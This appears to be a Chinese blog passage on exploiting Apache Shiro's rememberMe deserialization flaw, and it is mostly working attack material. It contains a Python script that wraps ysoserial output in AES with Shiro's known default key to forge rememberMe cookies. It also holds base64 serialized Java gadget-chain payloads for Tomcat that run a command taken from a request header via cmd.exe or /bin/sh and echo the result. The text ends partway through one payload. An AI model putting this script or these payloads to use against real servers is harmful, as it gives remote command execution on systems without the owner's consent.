<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_rememberme</span>(<span class="params">gadget, command</span>):</span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial.jar&#x27;</span>, gadget, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])   </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>利用脚本生成<code>payload</code></p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271403669.png" alt="image-20220927140309429"></p>
<p>在burp中发包</p>
<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271404527.png" alt="image-20220927140453336"></p>
<p>当然，也可以生成tomcat回显利用链，将命令执行的结果直接返回</p>
<blockquote>
<p>组合xray的6条tomcat回显链</p>
<p>CommonsCollectionsK1&#x2F;CommonsCollectionsK2&#x2F;CommonsBeanutils1&#x2F;CommonsBeanutils2&#x2F;Jdk7u21&#x2F;Jdk8u20</p>
</blockquote>
<p>下面为六条tomcat回显链的payload，需要再进行AES+Base64加密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tomcatEchoPayload=&#123;&quot;CommonsCollectionsK1&quot;:&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMACEkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFoAFV91c2VTZXJ2aWNlc01lY2hhbmlzbUwAC19hdXhDbGFzc2VzdAA7TGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0hhc2h0YWJsZTtbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAH/////AXB1cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAAPA8r+ur4AAAAyAOkBAAxGb29XRWN0SGptdmEHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEAEUZvb1dFY3RIam12YS5qYXZhAQAJd3JpdGVCb2R5AQAXKExqYXZhL2xhbmcvT2JqZWN0O1tCKVYBACRvcmcuYXBhY2hlLnRvbWNhdC51dGlsLmJ1Zi5CeXRlQ2h1bmsIAAkBAA9qYXZhL2xhbmcvQ2xhc3MHAAsBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwwADQAOCgAMAA8BAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DAARABIKAAwAEwEACHNldEJ5dGVzCAAVAQACW0IHABcBABFqYXZhL2xhbmcvSW50ZWdlcgcAGQEABFRZUEUBABFMamF2YS9sYW5nL0NsYXNzOwwAGwAcCQAaAB0BABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsMAB8AIAoADAAhAQAGPGluaXQ+AQAEKEkpVgwAIwAkCgAaACUBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHACcBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMACkAKgoAKAArAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7DAAtAC4KAAQALwEAB2RvV3JpdGUIADEBAAlnZXRNZXRob2QMADMAIAoADAA0AQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcANgEAE2phdmEubmlvLkJ5dGVCdWZmZXIIADgBAAR3cmFwCAA6AQAEQ29kZQEACkV4Y2VwdGlvbnMBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwA+AQANU3RhY2tNYXBUYWJsZQEABWdldEZWAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7DABDAEQKAAwARQEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgcARwEADWdldFN1cGVyY2xhc3MMAEkALgoADABKAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAAjAEwKAEgATQEAImphdmEvbGFuZy9yZWZsZWN0L0FjY2Vzc2libGVPYmplY3QHAE8BAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwAUQBSCgBQAFMBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcAVQEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DABXAFgKAFYAWQEAEGphdmEvbGFuZy9TdHJpbmcHAFsBAAMoKVYMACMAXQoABABeAQAQamF2YS9sYW5nL1RocmVhZAcAYAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwwAYgBjCgBhAGQBAA5nZXRUaHJlYWRHcm91cAEAGSgpTGphdmEvbGFuZy9UaHJlYWRHcm91cDsMAGYAZwoAYQBoAQAHdGhyZWFkcwgAagwAQQBCCgACAGwBABNbTGphdmEvbGFuZy9UaHJlYWQ7BwBuAQAHZ2V0TmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7DABwAHEKAGEAcgEABGV4ZWMIAHQBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwAdgB3CgBcAHgBAARodHRwCAB6AQAGdGFyZ2V0CAB8AQASamF2YS9sYW5nL1J1bm5hYmxlBwB+AQAGdGhpcyQwCACAAQAHaGFuZGxlcggAggEABmdsb2JhbAgAhAEACnByb2Nlc3NvcnMIAIYBAA5qYXZhL3V0aWwvTGlzdAcAiAEABHNpemUBAAMoKUkMAIoAiwsAiQCMAQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7DABXAI4LAIkAjwEAA3JlcQgAkQEAC2dldFJlc3BvbnNlCACTAQAJZ2V0SGVhZGVyCACVAQAIVGVzdGVjaG8IAJcBAAdpc0VtcHR5AQADKClaDACZAJoKAFwAmwEACXNldFN0YXR1cwgAnQEACWFkZEhlYWRlcggAnwEAB1Rlc3RjbWQIAKEBAAdvcy5uYW1lCACjAQAQamF2YS9sYW5nL1N5c3RlbQcApQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsMAKcAqAoApgCpAQALdG9Mb3dlckNhc2UMAKsAcQoAXACsAQAGd2luZG93CACuAQAHY21kLmV4ZQgAsAEAAi9jCACyAQAHL2Jpbi9zaAgAtAEAAi1jCAC2AQARamF2YS91dGlsL1NjYW5uZXIHALgBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIHALoBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWDAAjALwKALsAvQEABXN0YXJ0AQAVKClM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dGlsLkhhc2h0YWJsZRO7DyUhSuS4AwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAh3CAAAAAsAAAAAeHB3AQB4c3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4AClsAC2lQYXJhbVR5cGVzcQB+AAl4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAB0AA5uZXdUcmFuc2Zvcm1lcnVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHNxAH4AAD9AAAAAAAAMdwgAAAAQAAAAAHh4dAABdHg=&quot;,</span><br><span class="line">                    &quot;CommonsCollectionsK2&quot;:&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANW9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAhJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhaABVfdXNlU2VydmljZXNNZWNoYW5pc21MAAtfYXV4Q2xhc3Nlc3QAO0xjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9IYXNodGFibGU7WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAB/////wFwdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAADwPK/rq+AAAAMgDpAQAMRm9vZ2RMUVpRbjZlBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBABFGb29nZExRWlFuNmUuamF2YQEACXdyaXRlQm9keQEAFyhMamF2YS9sYW5nL09iamVjdDtbQilWAQAkb3JnLmFwYWNoZS50b21jYXQudXRpbC5idWYuQnl0ZUNodW5rCAAJAQAPamF2YS9sYW5nL0NsYXNzBwALAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsMAA0ADgoADAAPAQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwwAEQASCgAMABMBAAhzZXRCeXRlcwgAFQEAAltCBwAXAQARamF2YS9sYW5nL0ludGVnZXIHABkBAARUWVBFAQARTGphdmEvbGFuZy9DbGFzczsMABsAHAkAGgAdAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DAAfACAKAAwAIQEABjxpbml0PgEABChJKVYMACMAJAoAGgAlAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kBwAnAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DAApACoKACgAKwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwALQAuCgAEAC8BAAdkb1dyaXRlCAAxAQAJZ2V0TWV0aG9kDAAzACAKAAwANAEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24HADYBABNqYXZhLm5pby5CeXRlQnVmZmVyCAA4AQAEd3JhcAgAOgEABENvZGUBAApFeGNlcHRpb25zAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcAPgEADVN0YWNrTWFwVGFibGUBAAVnZXRGVgEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwwAQwBECgAMAEUBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24HAEcBAA1nZXRTdXBlcmNsYXNzDABJAC4KAAwASgEAFShMamF2YS9sYW5nL1N0cmluZzspVgwAIwBMCgBIAE0BACJqYXZhL2xhbmcvcmVmbGVjdC9BY2Nlc3NpYmxlT2JqZWN0BwBPAQANc2V0QWNjZXNzaWJsZQEABChaKVYMAFEAUgoAUABTAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQHAFUBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAVwBYCgBWAFkBABBqYXZhL2xhbmcvU3RyaW5nBwBbAQADKClWDAAjAF0KAAQAXgEAEGphdmEvbGFuZy9UaHJlYWQHAGABAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsMAGIAYwoAYQBkAQAOZ2V0VGhyZWFkR3JvdXABABkoKUxqYXZhL2xhbmcvVGhyZWFkR3JvdXA7DABmAGcKAGEAaAEAB3RocmVhZHMIAGoMAEEAQgoAAgBsAQATW0xqYXZhL2xhbmcvVGhyZWFkOwcAbgEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwwAcABxCgBhAHIBAARleGVjCAB0AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoMAHYAdwoAXAB4AQAEaHR0cAgAegEABnRhcmdldAgAfAEAEmphdmEvbGFuZy9SdW5uYWJsZQcAfgEABnRoaXMkMAgAgAEAB2hhbmRsZXIIAIIBAAZnbG9iYWwIAIQBAApwcm9jZXNzb3JzCACGAQAOamF2YS91dGlsL0xpc3QHAIgBAARzaXplAQADKClJDACKAIsLAIkAjAEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwwAVwCOCwCJAI8BAANyZXEIAJEBAAtnZXRSZXNwb25zZQgAkwEACWdldEhlYWRlcggAlQEACFRlc3RlY2hvCACXAQAHaXNFbXB0eQEAAygpWgwAmQCaCgBcAJsBAAlzZXRTdGF0dXMIAJ0BAAlhZGRIZWFkZXIIAJ8BAAdUZXN0Y21kCAChAQAHb3MubmFtZQgAowEAEGphdmEvbGFuZy9TeXN0ZW0HAKUBAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7DACnAKgKAKYAqQEAC3RvTG93ZXJDYXNlDACrAHEKAFwArAEABndpbmRvdwgArgEAB2NtZC5leGUIALABAAIvYwgAsgEABy9iaW4vc2gIALQBAAItYwgAtgEAEWphdmEvdXRpbC9TY2FubmVyBwC4AQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyBwC6AQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgwAIwC8CgC7AL0BAAVzdGFydAEAFSgp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dXRpbC5IYXNodGFibGUTuw8lIUrkuAMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAIdwgAAAALAAAAAHhwdwEAeHNyACtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnM0Lm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAtTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9uczQvVHJhbnNmb3JtZXI7eHBzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zNC5mdW5jdG9ycy5JbnZva2VyVHJhbnNmb3JtZXKH6P9re3zOOAIAA1sABWlBcmdzdAATW0xqYXZhL2xhbmcvT2JqZWN0O0wAC2lNZXRob2ROYW1lcQB+AApbAAtpUGFyYW1UeXBlc3EAfgAJeHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAAdAAObmV3VHJhbnNmb3JtZXJ1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAABzcQB+AAA/QAAAAAAADHcIAAAAEAAAAAB4eHQAAXR4&quot;,</span><br><span class="line">                    &quot;CommonsBeanutils1&quot;:&quot;rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAADwPK/rq+AAAAMgDpAQAMRm9vRERsMlpGZjhZBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBABFGb29ERGwyWkZmOFkuamF2YQEACXdyaXRlQm9keQEAFyhMamF2YS9sYW5nL09iamVjdDtbQilWAQAkb3JnLmFwYWNoZS50b21jYXQudXRpbC5idWYuQnl0ZUNodW5rCAAJAQAPamF2YS9sYW5nL0NsYXNzBwALAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsMAA0ADgoADAAPAQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwwAEQASCgAMABMBAAhz